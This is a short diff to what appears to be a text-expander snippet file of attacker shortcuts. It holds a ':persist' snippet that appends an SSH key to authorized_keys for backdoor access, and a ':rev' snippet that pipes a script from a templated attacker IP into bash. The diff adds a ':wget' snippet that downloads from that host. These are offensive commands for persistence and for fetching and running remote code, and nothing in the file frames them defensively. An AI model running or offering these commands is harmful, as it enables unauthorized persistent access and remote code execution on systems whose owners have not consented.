@@ -58,7 +58,10 @@ matches:
   - trigger: ":persist"
     replace: |
       mkdir -p /root/.ssh
-      echo {{ssh_key}} >> /root/.ssh/authorized_keys
+      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
   
   - trigger: ":rev"
     replace: curl http://{{IP}}/shell.sh | bash
+  
+  - trigger: ":wget"
+    replace: wget http://{{IP}}/
